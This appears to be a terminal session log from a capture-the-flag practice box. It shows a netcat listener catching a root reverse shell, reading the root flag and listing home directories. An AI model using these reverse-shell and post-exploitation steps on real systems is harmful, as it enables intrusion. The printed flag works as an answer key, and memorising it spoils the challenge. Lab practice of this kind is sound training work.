@@ -1,0 +1,91 @@
+Script started on 2025-03-31 03:30:40+03:00 [COMMAND="rlwrap nc -lnvp 4444" TERM="xterm-256color" TTY="/dev/pts/8" COLUMNS="104" LINES="27"]
+[?2004hlistening on [any] 4444 ...
+[Kconnect to [172.31.95.146] from (UNKNOWN) [172.31.80.1] 6025
+[Kroot@THM-Chal:/home/itguy# [Kroot@THM-Chal:/home/itguy# [K[?2004hroot@THM-Chal:/home/itguy# id[?2004l[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[K[?2004hid
+[Kid
+[Kuid=0(root) gid=0(root) groups=0(root)
+root@THM-Chal:/home/itguy# [Kroot@THM-Chal:/home/itguy# [K[?2004hroot@THM-Chal:/home/itguy# cd /root[?2004l[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[K[?2004hcd /root
+[Kcd /root
+root@THM-Chal:~# [Kroot@THM-Chal:~# [K[?2004hroot@THM-Chal:~# ls[?2004l[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[K[?2004hls
+[Kls
+[Kroot.txt
+root@THM-Chal:~# [Kroot@THM-Chal:~# [K[?2004hroot@THM-Chal:~# cat root.txt[?2004l[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[K[?2004hcat root.txt
+[Kcat root.txt
+[KTHM{6637f41d0177b6f37cb20d775124699f}
+root@THM-Chal:~# [Kroot@THM-Chal:~# [K[?2004hroot@THM-Chal:~# ls -al[?2004l[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[K[?2004hls -al
+[Kls -al
+[Ktotal 28
+drwxr-x---  4 root root 4096 mar 31 02:20 .
+drwxr-xr-x 23 root root 4096 nov 29  2019 ..
+lrwxrwxrwx  1 root root    9 nov 29  2019 .bash_history -> /dev/null
+-rw-r--r--  1 root root 3106 oct 22  2015 .bashrc
+drwx------  2 root root 4096 feb 27  2019 .cache
+drwxr-xr-x  2 root root 4096 nov 29  2019 .nano
+-rw-r--r--  1 root root  148 aug 17  2015 .profile
+-rw-r--r--  1 root root   38 nov 29  2019 root.txt
+root@THM-Chal:~# [Kroot@THM-Chal:~# [K[?2004hroot@THM-Chal:~# y[Kcd /home[?2004l[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[K[?2004hcd /home
+[Kcd /home
+root@THM-Chal:/home# [Kroot@THM-Chal:/home# [K[?2004hroot@THM-Chal:/home# ls [?2004l[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[K[?2004hls 
+[Kls 
+[K[K[?2004hc[K[?2004litguy
+root@THM-Chal:/home# [K[?2004hroot@THM-Chal:/home# cd itguy[?2004l[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[K[?2004hcd itguy
+[Kcd itguy
+root@THM-Chal:/home/itguy# [Kroot@THM-Chal:/home/itguy# [K[?2004hroot@THM-Chal:/home/itguy# ls[?2004l[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[K[?2004hls
+[Kls
+[KDesktop
+Documents
+Downloads
+Music
+Pictures
+Public
+Templates
+Videos
+backup.pl
+examples.desktop
+mysql_login.txt
+user.txt
+root@THM-Chal:/home/itguy# [Kroot@THM-Chal:/home/itguy# [K[?2004hroot@THM-Chal:/home/itguy# ls -al[?2004l[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[K[?2004hls -al
+[Kls -al
+[Ktotal 148
+drwxr-xr-x 18 itguy itguy 4096 nov 30  2019 .
+drwxr-xr-x  3 root  root  4096 nov 29  2019 ..
+-rw-------  1 itguy itguy 1630 nov 30  2019 .ICEauthority
+-rw-------  1 itguy itguy   53 nov 30  2019 .Xauthority
+lrwxrwxrwx  1 root  root     9 nov 29  2019 .bash_history -> /dev/null
+-rw-r--r--  1 itguy itguy  220 nov 29  2019 .bash_logout
+-rw-r--r--  1 itguy itguy 3771 nov 29  2019 .bashrc
+drwx------ 13 itguy itguy 4096 nov 29  2019 .cache
+drwx------ 14 itguy itguy 4096 nov 29  2019 .config
+drwx------  3 itguy itguy 4096 nov 29  2019 .dbus
+-rw-r--r--  1 itguy itguy   25 nov 29  2019 .dmrc
+drwx------  2 itguy itguy 4096 nov 29  2019 .gconf
+drwx------  3 itguy itguy 4096 nov 30  2019 .gnupg
+drwx------  3 itguy itguy 4096 nov 29  2019 .local
+drwx------  5 itguy itguy 4096 nov 29  2019 .mozilla
+-rw-------  1 itguy itguy  149 nov 29  2019 .mysql_history
+drwxrwxr-x  2 itguy itguy 4096 nov 29  2019 .nano
+-rw-r--r--  1 itguy itguy  655 nov 29  2019 .profile
+-rw-r--r--  1 itguy itguy    0 nov 29  2019 .sudo_as_admin_successful
+-rw-r-----  1 itguy itguy    5 nov 30  2019 .vboxclient-clipboard.pid
+-rw-r-----  1 itguy itguy    5 nov 30  2019 .vboxclient-display.pid
+-rw-r-----  1 itguy itguy    5 nov 30  2019 .vboxclient-draganddrop.pid
+-rw-r-----  1 itguy itguy    5 nov 30  2019 .vboxclient-seamless.pid
+-rw-------  1 itguy itguy   82 nov 30  2019 .xsession-errors
+-rw-------  1 itguy itguy   82 nov 29  2019 .xsession-errors.old
+drwxr-xr-x  2 itguy itguy 4096 nov 29  2019 Desktop
+drwxr-xr-x  2 itguy itguy 4096 nov 29  2019 Documents
+drwxr-xr-x  2 itguy itguy 4096 nov 29  2019 Downloads
+drwxr-xr-x  2 itguy itguy 4096 nov 29  2019 Music
+drwxr-xr-x  2 itguy itguy 4096 nov 29  2019 Pictures
+drwxr-xr-x  2 itguy itguy 4096 nov 29  2019 Public
+drwxr-xr-x  2 itguy itguy 4096 nov 29  2019 Templates
+drwxr-xr-x  2 itguy itguy 4096 nov 29  2019 Videos
+-rw-r--r-x  1 root  root    47 nov 29  2019 backup.pl
+-rw-r--r--  1 itguy itguy 8980 nov 29  2019 examples.desktop
+-rw-rw-r--  1 itguy itguy   16 nov 29  2019 mysql_login.txt
+-rw-rw-r--  1 itguy itguy   38 nov 29  2019 user.txt
+root@THM-Chal:/home/itguy# [Kroot@THM-Chal:/home/itguy# [K[?2004hroot@THM-Chal:/home/itguy# exit[?2004l[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[K[?2004hexit
+[Kexit
+exit
+[?2004l
+Script done on 2025-03-31 03:33:18+03:00 [COMMAND_EXIT_CODE="0"]
